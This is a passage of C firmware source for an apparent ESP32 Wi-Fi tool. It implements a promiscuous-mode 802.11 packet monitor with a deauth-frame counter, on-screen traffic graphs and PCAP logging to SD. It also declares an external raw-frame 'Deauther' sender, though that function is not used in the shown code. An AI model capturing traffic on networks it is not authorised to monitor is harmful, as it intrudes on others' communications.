#include <inttypes.h>

#include "arpa/inet.h"
#include "button_input.h"
#include "c_vector.h"
#include "captive_dns.h"
#include "config.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_ota_ops.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "feature_text.h"
#include "firmware_update.h"
#include "freertos/FreeRTOS.h"
#include "freertos/queue.h"
#include "freertos/task.h"
#include "icon.h"
#include "keyboard_ui.h"
#include "lwip/etharp.h"
#include "lwip/netif.h"
#include "math.h"
#include "mdns.h"
#include "netinet/in.h"
#include "nvs.h"
#include "nvs_flash.h"
#include "settings_store.h"
#include "shared.h"
#include "signal_dsp.h"
#include "stdatomic.h"
#include "sys/socket.h"
#include "touch_ui.h"
#include "ui_utils.h"

/** Active-scan dwell per channel for STA scans (shared.h WIFI_SCAN_ACTIVE_MS).
 */
static inline uint32_t wifiStaScanMsPerChannel(void) {
  return (uint32_t)DIV_CLAMP((long)WIFI_SCAN_ACTIVE_MS, 120L, 1500L);
}

static inline uint32_t wifiRandU32(uint32_t maxExclusive) {
  return maxExclusive ? (uint32_t)(esp_random() % maxExclusive) : 0U;
}

static inline int wifiRandInt_1(int maxExclusive) {
  return maxExclusive > 0 ? (int)wifiRandU32((uint32_t)maxExclusive) : 0;
}

static inline int wifiRandInt_2(int minInclusive, int maxExclusive) {
  if (maxExclusive <= minInclusive) {
    return minInclusive;
  }
  return minInclusive + wifiRandInt_1(maxExclusive - minInclusive);
}

static const char* kWifiScanTag = "WifiScan";

extern esp_err_t Deauther_sendRawFrame(const uint8_t* frame_buffer, int size);

#ifdef TFT_BLACK
#undef TFT_BLACK
#endif
#define TFT_BLACK FEATURE_BG

#ifndef FEATURE_TEXT
#define FEATURE_TEXT ORANGE
#endif
#ifndef FEATURE_WHITE
#define FEATURE_WHITE 0xFFFF
#endif

#ifdef TFT_WHITE
#undef TFT_WHITE
#endif
#define TFT_WHITE FEATURE_TEXT

#ifdef WHITE
#undef WHITE
#endif
#define WHITE FEATURE_WHITE

#ifdef DARK_GRAY
#undef DARK_GRAY
#endif
#define DARK_GRAY UI_FG

static int wifiScreenH(void) { return display_height(&(tft)); }
enum { kWifiBodyTop = 37 };

static int wifiContentBottom(void) {
  return featureHasTouchNavBar() ? touchNavContentBottomY() : wifiScreenH();
}

static int wifiMaxLinesInZone(int contentTop, int lineHeight) {
  const int h = wifiContentBottom() - contentTop;
  if (h <= 0 || lineHeight <= 0) {
    return 1;
  }
  return h / lineHeight;
}

static void wifiClearBody(uint16_t color) {
  const int bottom = wifiContentBottom();
  if (bottom > kWifiBodyTop) {
    display_fill_rect(&(tft), 0, kWifiBodyTop, display_width(&(tft)),
                      bottom - kWifiBodyTop, color);
  }
}

static int wifiListBottomY(void) { return wifiContentBottom() - 4; }

/** Toolbar / meter strip fills (0x4208); file-level DARK_GRAY is remapped to
 * UI_FG for text. */
enum { PacketMonitor_kPtmToolbarBg = 0x4208 };

static bool PacketMonitor_s_ptmHwReady = false;

#define MAX_CH 14
#define SNAP_LEN ESP32DIV_PCAP_SNAP_LEN

enum { PacketMonitor_PCAP_MAGIC_USEC = 0xa1b2c3d4 };
enum { PacketMonitor_PCAP_VER_MAJOR = 2 };
enum { PacketMonitor_PCAP_VER_MINOR = 4 };
enum { PacketMonitor_PCAP_SNAPLEN = 65535 };
enum { PacketMonitor_PCAP_DLT_IEEE802_11_RADIO = 127 };

enum { PacketMonitor_RADIOTAP_LEN = 19 };
enum {
  PacketMonitor_RADIOTAP_PRESENT = (1u << 1) | (1u << 3) | (1u << 5) |
  (1u << 11) | (1u << 19)
};

typedef struct __attribute__((packed)) PacketMonitor_RadiotapHdr16 {
  uint8_t it_version;
  uint8_t it_pad;
  uint16_t it_len;
  uint32_t it_present;
  uint8_t flags;
  uint8_t pad2;
  uint16_t chan_freq;
  uint16_t chan_flags;
  int8_t dbm_antsignal;
  uint8_t antenna;
  uint8_t mcs_known;
  uint8_t mcs_flags;
  uint8_t mcs;
} PacketMonitor_RadiotapHdr16;
#define PacketMonitor_RadiotapHdr16_INITIALIZER {0}
;

typedef struct __attribute__((packed)) PacketMonitor_PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
} PacketMonitor_PcapGlobalHeader;
#define PacketMonitor_PcapGlobalHeader_INITIALIZER {0}
;

typedef struct __attribute__((packed)) PacketMonitor_PcapRecordHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
} PacketMonitor_PcapRecordHeader;
#define PacketMonitor_PcapRecordHeader_INITIALIZER {0}
;

static bool PacketMonitor_pcapEnabled = false;
static bool PacketMonitor_pcapMounted = false;
static storage_file_t PacketMonitor_pcapFile = {0};
static text_t PacketMonitor_pcapPath = {0};
static uint32_t PacketMonitor_pcapPacketsWritten = 0;
static uint32_t PacketMonitor_pcapDropped = 0;
static uint32_t PacketMonitor_pcapLastFlushMs = 0;

enum { PacketMonitor_PCAP_POOL_SIZE = ESP32DIV_PCAP_POOL_SIZE };
typedef struct PacketMonitor_PcapSlot {
  PacketMonitor_PcapRecordHeader hdr;
  uint16_t caplen;
  uint8_t data[SNAP_LEN + PacketMonitor_RADIOTAP_LEN];
} PacketMonitor_PcapSlot;
#define PacketMonitor_PcapSlot_INITIALIZER {0}
;
static PacketMonitor_PcapSlot
    PacketMonitor_pcapPool[PacketMonitor_PCAP_POOL_SIZE];
static QueueHandle_t PacketMonitor_pcapFreeQ = NULL;
static QueueHandle_t PacketMonitor_pcapWriteQ = NULL;

static bool PacketMonitor_pcapMountSD(void) {
  if (PacketMonitor_pcapMounted) {
    if (storage_exists("/")) return true;
    PacketMonitor_pcapMounted = false;
  }

  PacketMonitor_pcapMounted = isSDCardAvailable();
  return PacketMonitor_pcapMounted;
}

static bool PacketMonitor_pcapEnsureDir(const char* dirPath) {
  if (!PacketMonitor_pcapMountSD()) return false;
  if (storage_exists(dirPath)) return true;
  if (storage_mkdir(dirPath)) return true;
  if (dirPath && dirPath[0] == '/') return storage_mkdir(dirPath + 1);
  return false;
}

static bool PacketMonitor_pcapMakeNextPath(text_t* outPath) {
  for (uint16_t i = 0; i < 10000; i++) {
    char buf[64];
    snprintf(buf, sizeof(buf), "%s/ptm_%04u.pcap", CAPTURE_DIR, (unsigned)i);
    if (!storage_exists(buf)) {
      (*outPath) = TEXT(buf);
      return true;
    }
  }
  return false;
}

static void PacketMonitor_pcapDisableAndCloseFile(void) {
  PacketMonitor_pcapEnabled = false;

  if (PacketMonitor_pcapWriteQ && PacketMonitor_pcapFreeQ) {
    uint8_t slotIdx;
    while (xQueueReceive(PacketMonitor_pcapWriteQ, &slotIdx, 0) == pdTRUE) {
      xQueueSend(PacketMonitor_pcapFreeQ, &slotIdx, 0);
    }
  }

  if (storage_file_valid(&(PacketMonitor_pcapFile))) {
    storage_file_flush(&(PacketMonitor_pcapFile));
    storage_file_close(&(PacketMonitor_pcapFile));
  }
  PacketMonitor_pcapPath = TEXT("");
}

static void PacketMonitor_pcapStop(void) {
  PacketMonitor_pcapDisableAndCloseFile();

  if (PacketMonitor_pcapWriteQ) {
    vQueueDelete(PacketMonitor_pcapWriteQ);
    PacketMonitor_pcapWriteQ = NULL;
  }
  if (PacketMonitor_pcapFreeQ) {
    vQueueDelete(PacketMonitor_pcapFreeQ);
    PacketMonitor_pcapFreeQ = NULL;
  }

  PacketMonitor_pcapPacketsWritten = 0;
  PacketMonitor_pcapDropped = 0;
  PacketMonitor_pcapLastFlushMs = 0;
}

static void PacketMonitor_pcapStart(void) {
  PacketMonitor_pcapStop();

  if (!PacketMonitor_pcapEnsureDir(CAPTURE_DIR)) return;
  if (!PacketMonitor_pcapMakeNextPath(&(PacketMonitor_pcapPath))) return;

  storage_file_replace(&(PacketMonitor_pcapFile),
                       storage_file_open((PacketMonitor_pcapPath).data, "wb"));
  if (!storage_file_valid(&(PacketMonitor_pcapFile))) {
    PacketMonitor_pcapPath = TEXT("");
    return;
  }

  PacketMonitor_PcapGlobalHeader gh =
      PacketMonitor_PcapGlobalHeader_INITIALIZER;
  gh.magic_number = PacketMonitor_PCAP_MAGIC_USEC;
  gh.version_major = PacketMonitor_PCAP_VER_MAJOR;
  gh.version_minor = PacketMonitor_PCAP_VER_MINOR;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = PacketMonitor_PCAP_SNAPLEN;
  gh.network = PacketMonitor_PCAP_DLT_IEEE802_11_RADIO;
  if (storage_file_write(&(PacketMonitor_pcapFile), (const uint8_t*)&gh,
                         sizeof(gh)) != sizeof(gh)) {
    storage_file_close(&(PacketMonitor_pcapFile));
    PacketMonitor_pcapPath = TEXT("");
    return;
  }

  PacketMonitor_pcapFreeQ =
      xQueueCreate(PacketMonitor_PCAP_POOL_SIZE, sizeof(uint8_t));
  PacketMonitor_pcapWriteQ =
      xQueueCreate(PacketMonitor_PCAP_POOL_SIZE, sizeof(uint8_t));
  if (!PacketMonitor_pcapFreeQ || !PacketMonitor_pcapWriteQ) {
    PacketMonitor_pcapStop();
    return;
  }

  for (uint8_t i = 0; i < PacketMonitor_PCAP_POOL_SIZE; i++) {
    xQueueSend(PacketMonitor_pcapFreeQ, &i, 0);
  }

  PacketMonitor_pcapEnabled = true;
  PacketMonitor_pcapLastFlushMs = sys_monotonic_ms();
}

static void PacketMonitor_ptmStartRadioAndPcapOnce(void) {
  if (!network_set_mode(WIFI_MODE_NULL)) {
    div_console_line(TEXT("Packet monitor: Wi-Fi initialization failed"));
    feature_exit_requested = true;
    return;
  }

  PacketMonitor_pcapStart();
  if (PacketMonitor_pcapEnabled && strlen((PacketMonitor_pcapPath).data)) {
    printf("[PCAP] PacketMonitor logging to SD: %s\n",
           (PacketMonitor_pcapPath).data);
  } else {
    div_console_line(
        TEXT("[PCAP] PacketMonitor: SD/PCAP logging not started (no SD or open "
             "failed)."));
  }
}

static uint16_t PacketMonitor_pcapChannelToFreqMHz(uint8_t channel) {
  if (channel == 14) return 2484;
  if (channel >= 1 && channel <= 13) return (uint16_t)(2407 + channel * 5);

  if (channel >= 32) return (uint16_t)(5000 + channel * 5);
  return 0;
}

static uint16_t PacketMonitor_pcapChannelFlags(uint16_t freqMHz) {
  if (freqMHz >= 2400 && freqMHz < 2500) return 0x0080;
  if (freqMHz >= 4900 && freqMHz < 6000) return 0x0100;
  return 0;
}

#define MAX_X 240
#define MAX_Y 320

bool PacketMonitor_btnLeftPressed = false;
bool PacketMonitor_btnRightPressed = false;

static const char* PacketMonitor_kPacketMonitorNvsNamespace = "packetmonitor32";

static uint32_t PacketMonitor_packetMonitorLoadChannel(void) {
  nvs_handle_t handle = 0;
  if (nvs_open(PacketMonitor_kPacketMonitorNvsNamespace, NVS_READONLY,
               &handle) != ESP_OK) {
    return 1;
  }

  uint32_t channel = 1;
  if (nvs_get_u32(handle, "channel", &channel) != ESP_OK) {
    channel = 1;
  }
  nvs_close(handle);
  return channel;
}

static void PacketMonitor_packetMonitorSaveChannel(uint32_t channel) {
  nvs_handle_t handle = 0;
  if (nvs_open(PacketMonitor_kPacketMonitorNvsNamespace, NVS_READWRITE,
               &handle) != ESP_OK) {
    return;
  }

  if (nvs_set_u32(handle, "channel", channel) == ESP_OK) {
    nvs_commit(handle);
  }
  nvs_close(handle);
}

enum { PacketMonitor_samples = 256 };
const double PacketMonitor_samplingFrequency = 5000;

double PacketMonitor_attenuation = 10;

unsigned int PacketMonitor_sampling_period_us;
unsigned long PacketMonitor_microseconds;

double PacketMonitor_vReal[PacketMonitor_samples];
double PacketMonitor_vImag[PacketMonitor_samples];

uint8_t PacketMonitor_palette_red[128], PacketMonitor_palette_green[128],
    PacketMonitor_palette_blue[128];

bool PacketMonitor_buttonPressed = false;
bool PacketMonitor_buttonEnabled = true;
uint32_t PacketMonitor_lastDrawTime;
uint32_t PacketMonitor_lastButtonTime;
uint32_t PacketMonitor_tmpPacketCounter;
uint32_t PacketMonitor_pkts[MAX_X];
uint32_t PacketMonitor_deauths = 0;
unsigned int PacketMonitor_ch = 1;
int PacketMonitor_rssiSum;

unsigned int PacketMonitor_epoch = 0;
unsigned int PacketMonitor_color_cursor = 2016;

void PacketMonitor_do_sampling_FFT(void) {
  PacketMonitor_microseconds = sys_monotonic_us();

  for (int i = 0; i < PacketMonitor_samples; i++) {
    PacketMonitor_vReal[i] = PacketMonitor_tmpPacketCounter * 300;
    PacketMonitor_vImag[i] = 1;
    while (sys_monotonic_us() - PacketMonitor_microseconds <
           PacketMonitor_sampling_period_us) {
    }
    PacketMonitor_microseconds += PacketMonitor_sampling_period_us;
  }

  double mean = 0;

  for (uint16_t i = 0; i < PacketMonitor_samples; i++)
    mean += PacketMonitor_vReal[i];
  mean /= PacketMonitor_samples;
  for (uint16_t i = 0; i < PacketMonitor_samples; i++)
    PacketMonitor_vReal[i] -= mean;

  PacketMonitor_microseconds = sys_monotonic_us();

  signalDspComputeMagnitude(PacketMonitor_vReal, PacketMonitor_vReal,
                            PacketMonitor_samples);

  unsigned int left_x = 120;
  unsigned int graph_y_offset = 91;
  int max_k = 0;

  for (int j = 0; j < PacketMonitor_samples >> 1; j++) {
    int k = PacketMonitor_vReal[j] / PacketMonitor_attenuation;
    if (k > max_k) max_k = k;
    if (k > 127) k = 127;

    unsigned int color = PacketMonitor_palette_red[k] << 11 |
                         PacketMonitor_palette_green[k] << 5 |
                         PacketMonitor_palette_blue[k];
    unsigned int vertical_x = left_x + j;
    const int plotY = PacketMonitor_epoch + graph_y_offset;
    if (plotY < wifiContentBottom()) {
      display_draw_pixel(&(tft), vertical_x, plotY, color);
    }
  }

  for (int j = 0; j < PacketMonitor_samples >> 1; j++) {
    int k = PacketMonitor_vReal[j] / PacketMonitor_attenuation;
    if (k > max_k) max_k = k;
    if (k > 127) k = 127;

    unsigned int color = PacketMonitor_palette_red[k] << 11 |
                         PacketMonitor_palette_green[k] << 5 |
                         PacketMonitor_palette_blue[k];
    unsigned int mirrored_x = left_x - j;
    const int plotY = PacketMonitor_epoch + graph_y_offset;
    if (plotY < wifiContentBottom()) {
      display_draw_pixel(&(tft), mirrored_x, plotY, color);
    }
  }

  unsigned int area_graph_x_offset = 120;
  unsigned int area_graph_height = 50;
  unsigned int area_graph_y_offset = 38;

  static int last_y[PacketMonitor_samples >> 1] = {0};
  display_fill_rect(&(tft), area_graph_x_offset, area_graph_y_offset,
                    (PacketMonitor_samples >> 1), area_graph_height, TFT_BLACK);

  for (int j = 0; j < PacketMonitor_samples >> 1; j++) {
    int k = PacketMonitor_vReal[j] / PacketMonitor_attenuation;
    if (k > 127) k = 127;

    unsigned int color = PacketMonitor_palette_red[k] << 11 |
                         PacketMonitor_palette_green[k] << 5 |
                         PacketMonitor_palette_blue[k];
    int current_y = area_graph_height -
                    (int)sys_scale(k, 0, 127, 0, area_graph_height) +
                    area_graph_y_offset;
    unsigned int x = area_graph_x_offset + j;

    if (j > 0) {
      display_fill_triangle(
          &(tft), x - 1, area_graph_y_offset + area_graph_height, x,
          area_graph_y_offset + area_graph_height, x - 1, last_y[j - 1], color);
      display_fill_triangle(&(tft), x - 1, last_y[j - 1], x,
                            area_graph_y_offset + area_graph_height, x,
                            current_y, color);
    }
    last_y[j] = current_y;
  }

  unsigned int area_graph_width = (PacketMonitor_samples >> 1);
  unsigned int area_graph_x_offset_flipped = -7;

  display_fill_rect(&(tft), area_graph_x_offset_flipped, area_graph_y_offset,
                    area_graph_width, area_graph_height, TFT_BLACK);

  for (int j = 0; j < PacketMonitor_samples >> 1; j++) {
    int k = PacketMonitor_vReal[j] / PacketMonitor_attenuation;
    if (k > 127) k = 127;

    unsigned int color = PacketMonitor_palette_red[k] << 11 |
                         PacketMonitor_palette_green[k] << 5 |
                         PacketMonitor_palette_blue[k];
    int current_y = area_graph_height -
                    (int)sys_scale(k, 0, 127, 0, area_graph_height) +
                    area_graph_y_offset;
    unsigned int x = area_graph_x_offset_flipped + area_graph_width - j - 1;

    if (j > 0) {
      display_fill_triangle(
          &(tft), x + 1, area_graph_y_offset + area_graph_height, x,
          area_graph_y_offset + area_graph_height, x + 1, last_y[j - 1], color);
      display_fill_triangle(&(tft), x + 1, last_y[j - 1], x,
                            area_graph_y_offset + area_graph_height, x,
                            current_y, color);
    }
    last_y[j] = current_y;
  }

  double tattenuation = max_k / 127.0;

  if (tattenuation > PacketMonitor_attenuation)
    PacketMonitor_attenuation = tattenuation;

  display_set_text_color_1(&(tft), TFT_WHITE);
  display_set_text_size(&(tft), 1);
  display_set_text_font(&(tft), 1);

  display_fill_rect(&(tft), 30, 20, 130, 16, PacketMonitor_kPtmToolbarBg);

  display_set_cursor(&(tft), 35, 24);
  display_print(&(tft), "Ch:");
  display_print(&(tft), (TEXT(PacketMonitor_ch)).data);

  display_set_cursor(&(tft), 80, 24);
  display_print(&(tft), "Packet:");
  display_print(&(tft), (TEXT(PacketMonitor_tmpPacketCounter)).data);

  sys_sleep_ms(10);
}

esp_err_t PacketMonitor_event_handler(void* ctx, esp_event_base_t base,
                                      int32_t id, void* data) {
  return ESP_OK;
}

double PacketMonitor_getMultiplicator(void) {
  uint32_t maxVal = 1;
  for (int i = 0; i < MAX_X; i++) {
    if (PacketMonitor_pkts[i] > maxVal) maxVal = PacketMonitor_pkts[i];
  }
  if (maxVal > MAX_Y)
    return (double)MAX_Y / (double)maxVal;
  else
    return 1;
}

void PacketMonitor_wifi_promiscuous(void* buf,
                                    wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
  const uint16_t packetLength = (uint16_t)ctrl.sig_len;

  if (type == WIFI_PKT_MGMT && packetLength > 0 &&
      (pkt->payload[0] == 0xA0 || pkt->payload[0] == 0xC0))
    PacketMonitor_deauths++;

  if (type == WIFI_PKT_MISC) return;
  const uint16_t captureLength = DIV_MIN(packetLength, SNAP_LEN);
  PacketMonitor_tmpPacketCounter++;
  PacketMonitor_rssiSum += ctrl.rssi;

  if (!PacketMonitor_pcapEnabled ||
      !storage_file_valid(&(PacketMonitor_pcapFile)) ||
      !PacketMonitor_pcapFreeQ || !PacketMonitor_pcapWriteQ)
    return;

  uint8_t slotIdx;
  if (xQueueReceive(PacketMonitor_pcapFreeQ, &slotIdx, 0) != pdTRUE) {
    PacketMonitor_pcapDropped++;
    return;
  }

  if (slotIdx >= PacketMonitor_PCAP_POOL_SIZE) {
    PacketMonitor_pcapDropped++;
    return;
  }

  __auto_type s = &(PacketMonitor_pcapPool[slotIdx]);

  const int64_t nowUs = esp_timer_get_time();
  (*s).hdr.ts_sec = (uint32_t)(nowUs / 1000000LL);
  (*s).hdr.ts_usec = (uint32_t)(nowUs % 1000000LL);

  const uint16_t freq =
      PacketMonitor_pcapChannelToFreqMHz((uint8_t)ctrl.channel);
  PacketMonitor_RadiotapHdr16 rt = PacketMonitor_RadiotapHdr16_INITIALIZER;
  rt.it_version = 0;
  rt.it_pad = 0;
  rt.it_len = PacketMonitor_RADIOTAP_LEN;
  rt.it_present = PacketMonitor_RADIOTAP_PRESENT;
  rt.flags = 0;
  rt.pad2 = 0;
  rt.chan_freq = freq;
  rt.chan_flags = PacketMonitor_pcapChannelFlags(freq);
  rt.dbm_antsignal = (int8_t)ctrl.rssi;
  rt.antenna = 0;
  rt.mcs_known = 0;
  rt.mcs_flags = 0;
  rt.mcs = 0;

  if (ctrl.sig_mode == 1) {
    rt.mcs_known = (1u << 0) | (1u << 1) | (1u << 2) | (1u << 4) | (1u << 5);

    const uint8_t bw = (ctrl.cwb ? 1 : 0);
    rt.mcs_flags |= (bw & 0x3);
    if (ctrl.sgi) rt.mcs_flags |= (1u << 2);
    if (ctrl.fec_coding) rt.mcs_flags |= (1u << 4);
    if (ctrl.stbc) rt.mcs_flags |= (1u << 5);

    rt.mcs = ctrl.mcs;
  }

  const uint16_t totalLen =
      (uint16_t)(PacketMonitor_RADIOTAP_LEN + captureLength);
  (*s).hdr.incl_len = totalLen;
  (*s).hdr.orig_len = PacketMonitor_RADIOTAP_LEN + packetLength;
  (*s).caplen = totalLen;
  memcpy((*s).data, &rt, PacketMonitor_RADIOTAP_LEN);
  memcpy((*s).data + PacketMonitor_RADIOTAP_LEN, pkt->payload, captureLength);

  if (xQueueSend(PacketMonitor_pcapWriteQ, &slotIdx, 0) != pdTRUE) {
    xQueueSend(PacketMonitor_pcapFreeQ, &slotIdx, 0);
    PacketMonitor_pcapDropped++;
    return;
  }
}

void PacketMonitor_setChannel(int newChannel) {
  PacketMonitor_ch = newChannel;
  if (PacketMonitor_ch > MAX_CH || PacketMonitor_ch < 1) PacketMonitor_ch = 1;

  PacketMonitor_packetMonitorSaveChannel(PacketMonitor_ch);

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_channel(PacketMonitor_ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous_rx_cb(&PacketMonitor_wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}

void PacketMonitor_draw(void) {
  double multiplicator = PacketMonitor_getMultiplicator();
  int len;
  int rssi;

  if (PacketMonitor_pkts[MAX_X - 1] > 0)
    rssi = PacketMonitor_rssiSum / (int)PacketMonitor_pkts[MAX_X - 1];
  else
    rssi = PacketMonitor_rssiSum;
}

static bool PacketMonitor_uiDrawn = false;

void PacketMonitor_runUI(void) {
#define SCREEN_WIDTH TFT_WIDTH
#undef SCREEN_HEIGHT
#define SCREEN_HEIGHT TFT_HEIGHT
#undef STATUS_BAR_Y_OFFSET
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#undef ICON_NUM
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {bitmap_icon_sort_up_plus,
                                                 bitmap_icon_sort_down_minus,
                                                 bitmap_icon_go_back};

  if (!PacketMonitor_uiDrawn) {
    display_fill_rect(&(tft), 0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH,
                      STATUS_BAR_HEIGHT, PacketMonitor_kPtmToolbarBg);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], ICON_SIZE,
                            ICON_SIZE, TFT_WHITE);
      }
    }
    display_draw_fast_h_line(&(tft), 0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT,
                             SCREEN_WIDTH, UI_LINE);
    PacketMonitor_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (sys_monotonic_ms() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > STATUS_BAR_Y_OFFSET &&
          y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 2) {
                feature_exit_requested = true;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i],
                                    ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();

                switch (i) {
                  case 0:
                    PacketMonitor_setChannel(PacketMonitor_ch + 1);
                    break;
                  case 1:
                    PacketMonitor_setChannel(PacketMonitor_ch - 1);
                    break;
                }
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

static void PacketMonitor_ptmDrawWaitCard(void) {
  enum { kPad = 14 };
  enum { kRadius = 8 };
  enum { kBodyTop = 40 };
  const int contentBottom = touchNavContentBottomY();
  const int bodyH = contentBottom - kBodyTop;
  if (bodyH > 0) {
    display_fill_rect(&(tft), 0, kBodyTop, display_width(&(tft)), bodyH,
                      TFT_BLACK);
  }

  const int cardW = display_width(&(tft)) - 2 * kPad;
  enum { cardH = 96 };
  const int cardX = kPad;
  int cardY = kBodyTop + (bodyH - cardH) / 2;
  if (cardY < kBodyTop + 4) {
    cardY = kBodyTop + 4;
  }

  display_fill_round_rect(&(tft), cardX, cardY, cardW, cardH, kRadius, UI_FG);
  display_draw_round_rect(&(tft), cardX, cardY, cardW, cardH, kRadius, UI_LINE);

  enum { kTitleH = 26 };
  display_draw_fast_h_line(&(tft), cardX + 8, cardY + kTitleH, cardW - 16,
                           UI_LINE);

  display_set_text_datum(&(tft), MC_DATUM);
  display_set_text_font(&(tft), 1);
  display_set_text_color_2(&(tft), FEATURE_TEXT, UI_FG);
  display_draw_string(&(tft), "Please Wait", cardX + cardW / 2, cardY + 14, 0);

  display_set_text_font(&(tft), 1);
  display_set_text_color_2(&(tft), UI_TEXT, UI_FG);
  display_draw_string(&(tft), "802.11 monitor - standby", cardX + cardW / 2,
                      cardY + 44, 0);
  display_set_text_color_2(&(tft), UI_WARN, UI_FG);
  display_draw_string(&(tft), "Initializing [do not exit]", cardX + cardW / 2,
                      cardY + 62, 0);
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_font(&(tft), 1);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_TEXT, FEATURE_BG);
}

void PacketMonitor_ptmSetup(void) {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels("Ch-", NULL, "Exit", NULL, "Ch+");
  PacketMonitor_s_ptmHwReady = false;

#if HAS_PCF8574_BUTTONS
  pcf8574_configure_pin(button_input_device(), BTN_UP, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_DOWN, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_LEFT, GPIO_MODE_INPUT);
  pcf8574_configure_pin(button_input_device(), BTN_RIGHT, GPIO_MODE_INPUT);
#endif

  featureClearContent(TFT_BLACK);

  {
    float vBat = currentBatteryVoltage;
    if (vBat < 0.05f) {
      vBat = readBatteryVoltage();
    }
    drawStatusBar(vBat, true, false);
  }
  redrawTouchButtonBar();

  setupTouchscreen();

  PacketMonitor_sampling_period_us =
      round(1000000 * (1.0 / PacketMonitor_samplingFrequency));

  for (int i = 0; i < 32; i++) {
    PacketMonitor_palette_red[i] = i / 2;
    PacketMonitor_palette_green[i] = 0;
    PacketMonitor_palette_blue[i] = i;
  }
  for (int i = 32; i < 64; i++) {
    PacketMonitor_palette_red[i] = i / 2;
    PacketMonitor_palette_green[i] = 0;
    PacketMonitor_palette_blue[i] = 63 - i;
  }
  for (int i = 64; i < 96; i++) {
    PacketMonitor_palette_red[i] = 31;
    PacketMonitor_palette_green[i] = (i - 64) * 2;
    PacketMonitor_palette_blue[i] = 0;
  }
  for (int i = 96; i < 128; i++) {
    PacketMonitor_palette_red[i] = 31;
    PacketMonitor_palette_green[i] = 63;
    PacketMonitor_palette_blue[i] = i - 96;
  }

  PacketMonitor_ch = PacketMonitor_packetMonitorLoadChannel();

  PacketMonitor_uiDrawn = false;
  PacketMonitor_runUI();

  /* Radio + PCAP init runs on first loop; show a short wait hint on the body.
   */
  PacketMonitor_ptmDrawWaitCard();
  redrawTouchButtonBar();
}

void PacketMonitor_ptmLoop(void) {
  if (!PacketMonitor_s_ptmHwReady) {
    PacketMonitor_ptmStartRadioAndPcapOnce();
    PacketMonitor_s_ptmHwReady = true;
    enum { kPtmWaitBodyTop = 40 };
    const int bodyH = wifiContentBottom() - kPtmWaitBodyTop;
    if (bodyH > 0) {
      display_fill_rect(&(tft), 0, kPtmWaitBodyTop, display_width(&(tft)),
                        bodyH, TFT_BLACK);
    }
  }

  if (feature_active &&
      (isButtonPressed(BTN_SELECT) || featureExitButtonPressed())) {
    esp_wifi_set_promiscuous(false);
    if (PacketMonitor_pcapPacketsWritten || PacketMonitor_pcapDropped) {
      printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
             (unsigned long)PacketMonitor_pcapPacketsWritten,
             (unsigned long)PacketMonitor_pcapDropped);
    }
    PacketMonitor_pcapStop();
    feature_exit_requested = true;
    return;
  }

  PacketMonitor_runUI();
  if (feature_exit_requested) {
    esp_wifi_set_promiscuous(false);
    if (PacketMonitor_pcapPacketsWritten || PacketMonitor_pcapDropped) {
      printf("[PCAP] PacketMonitor stopped. written=%lu dropped=%lu\n",
             (unsigned long)PacketMonitor_pcapPacketsWritten,
             (unsigned long)PacketMonitor_pcapDropped);
    }
    PacketMonitor_pcapStop();
    return;
  }
  updateStatusBar();

  esp_wifi_set_channel(PacketMonitor_ch, WIFI_SECOND_CHAN_NONE);

  esp_wifi_set_promiscuous_rx_cb(&PacketMonitor_wifi_promiscuous);
  esp_wifi_set_promiscuous(true);

  if ((PacketMonitor_pcapEnabled &&
       storage_file_valid(&(PacketMonitor_pcapFile))) &&
      PacketMonitor_pcapWriteQ && PacketMonitor_pcapFreeQ) {
    uint8_t slotIdx;

    uint16_t drained = 0;
    while (drained < 12 &&
           xQueueReceive(PacketMonitor_pcapWriteQ, &slotIdx, 0) == pdTRUE) {
